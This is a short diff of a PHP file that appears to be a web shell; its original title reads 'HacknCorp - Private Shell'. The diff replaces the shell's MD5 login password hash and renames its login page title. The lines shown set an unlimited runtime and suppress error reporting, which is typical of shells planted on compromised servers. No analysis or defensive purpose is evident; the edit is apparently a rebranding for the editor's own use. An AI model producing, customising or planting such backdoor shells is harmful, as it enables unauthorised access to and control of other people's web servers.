@@ -1,7 +1,7 @@
 <?php 
 set_time_limit(0);
 error_reporting(0);
-$auth_pass ="21232f297a57a5a743894a0e4a801fc3";
+$auth_pass ="2f9631831988616d2435b736bd93d8b9";
 if(get_magic_quotes_gpc()) {   
 function VEstripslashes($array) {     
 return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);   }   
@@ -11,7 +11,7 @@ function Login() {
   die("<!DOCTYPE html>
   <html>
       <head>
-          <title>𝐇𝐚𝐜𝐤𝐧𝐂𝐨𝐫𝐩 - 𝐏𝐫𝐢𝐯𝐚𝐭𝐞 𝐒𝐡𝐞𝐥𝐥</title>=
+          <title>𝖕𝖊𝖉𝖐𝖊𝖉</title>=
           <link rel='preconnect' href='https://fonts.googleapis.com'>
           <link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>
           <link href='https://fonts.googleapis.com/css2?family=Caveat:wght@700&display=swap' rel='stylesheet'>
